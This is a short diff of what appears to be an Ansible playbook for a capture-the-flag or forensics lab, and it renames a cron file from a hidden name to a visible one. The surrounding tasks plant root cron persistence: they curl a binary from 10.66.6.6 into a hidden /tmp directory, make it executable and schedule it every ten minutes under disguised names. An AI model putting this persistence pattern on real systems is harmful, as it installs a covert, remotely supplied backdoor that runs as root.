@@ -55,7 +55,7 @@
 
 - name: plant cron persistence (flag lands beside it post-deploy)
   ansible.builtin.copy:
-    dest: /etc/cron.d/.sysupdate
+    dest: /etc/cron.d/sysupdate
     content: "*/10 * * * * root /tmp/.x11-cache/upd >/dev/null 2>&1\n"
     mode: "0644"
 
@@ -67,7 +67,7 @@
       cd /tmp/.x11-cache
       sudo curl -o /tmp/.x11-cache/upd http://10.66.6.6/upd
       sudo chmod +x /tmp/.x11-cache/upd
-      sudo bash -c "echo '*/10 * * * * root /tmp/.x11-cache/upd' > /etc/cron.d/.sysupdate"
+      sudo bash -c "echo '*/10 * * * * root /tmp/.x11-cache/upd' > /etc/cron.d/sysupdate"
       sudo ls -la /tmp/.x11-cache/
       exit
     owner: ops
